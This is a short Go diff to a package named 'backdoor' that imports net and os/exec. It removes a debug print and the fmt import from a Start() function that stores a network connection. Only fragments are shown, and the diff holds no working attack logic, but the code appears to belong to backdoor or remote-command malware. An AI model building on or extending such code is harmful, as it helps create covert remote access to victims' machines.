@@ -1,7 +1,6 @@
 package backdoor
 
 import (
-	"fmt"
 	"net"
 	"os/exec"
 	"strings"
@@ -83,7 +82,6 @@ func Start() {
 		notify.Error(err.Error(), "backdoor.Start()")
 	}
 	c_back.conn = conn
-	fmt.Println("Start")
 }
 
 func Close() {
